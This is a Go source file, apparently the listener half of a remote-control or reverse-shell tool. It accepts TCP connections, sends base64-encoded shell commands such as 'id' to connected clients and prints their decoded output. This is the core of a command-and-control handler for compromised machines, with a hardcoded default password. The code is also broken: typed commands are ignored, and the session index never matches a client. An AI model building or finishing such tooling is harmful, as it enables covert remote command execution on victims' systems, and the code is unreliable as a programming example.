package main

import (
	"bufio"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"sync"
	"time"
)

const (
	WHITE   = "\x1b[37;1m"
	RED     = "\x1b[31;1m"
	GREEN   = "\x1b[32;1m"
	YELLOW  = "\x1b[33;1m"
	BLUE    = "\x1b[34;1m"
	MAGENTA = "\x1b[35;1m"
	CYAN    = "\x1b[36;1m"
	VERSION = "2.5.0"
)

var (
	inputIP         = flag.String("IP", "0.0.0.0", "Listen IP")
	inputPort       = flag.String("PORT", "8081", "Listen Port")
	connPwd         = flag.String("PWD", "18Sd9fkdkf9", "Connection Password")
	counter         int                                       //用于会话计数，给map的key使用
	connlist        map[int]net.Conn = make(map[int]net.Conn) //存储所有连接的会话
	connlistIPAddr  map[int]string   = make(map[int]string)   //存储所有IP地址，提供输入标识符显示
	lock                             = &sync.Mutex{}
	downloadOutName string
)

func getDateTime() string {
	currentTime := time.Now()
	// https://golang.org/pkg/time/#example_Time_Format
	return currentTime.Format("2006-01-02-15-04-05")
}

// ReadLine 函数等待命令行输入,返回字符串
func ReadLine() string {
	buf := bufio.NewReader(os.Stdin)
	lin, _, err := buf.ReadLine()
	if err != nil {
		fmt.Println(RED, "[!] Error to Read Line!")
	}
	return string(lin)
}

// Socket客户端连接处理程序,专用于接收消息处理
func connection(conn net.Conn) {
	log.Println("connection...")
	defer conn.Close()
	var myid int
	myip := conn.RemoteAddr().String()
	log.Println(myip)
	lock.Lock()
	counter++
	myid = counter
	connlist[counter] = conn
	connlistIPAddr[counter] = myip
	lock.Unlock()

	fmt.Printf("--- client: %s connection ---\n", myip)
	for {
		message, err := bufio.NewReader(conn).ReadString('\n')
		//如果客户端断开
		if err == io.EOF {
			conn.Close()
			delete(connlist, myid)
			delete(connlistIPAddr, myid)
			break
		}
		decoded, _ := base64.StdEncoding.DecodeString(message)
		fmt.Println(decoded)
		decMessage := string(decoded)
		fmt.Println(decMessage)
		switch decMessage {
		default:
			fmt.Println("\n" + decMessage)
		}
	}
	fmt.Printf("--- %s close---\n", myip)
}

// 等待Socket 客户端连接
func handleConnWait() {
	log.Println("xxxxxxx")
	log.Println(*inputIP, *inputPort)
	l, err := net.Listen("tcp", *inputIP+":"+*inputPort)
	if err != nil {
		log.Fatal(err)
	}
	defer l.Close()
	for {
		conn, err := l.Accept()
		if err != nil {
			log.Fatal(err)
		}
		//message, err := bufio.NewReader(conn).ReadString('\n')

		go connection(conn)
	}
}

func main() {
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
	flag.Parse()
	go handleConnWait()
	connid := 0
	comandx := "id"
	for {
		fmt.Print(connlistIPAddr[connid])
		command := ReadLine()
		log.Println(command)
		_conn, ok := connlist[connid]
		switch command {
		default:
			if ok {
				_cmd := base64.URLEncoding.EncodeToString([]byte(comandx))
				_conn.Write([]byte(_cmd + "\n"))
			}
		}
	}
}

// ClearScreen 清除屏幕
func ClearScreen() {
	cmd := exec.Command("clear")
	cmd.Stdout = os.Stdout
	cmd.Run()
}
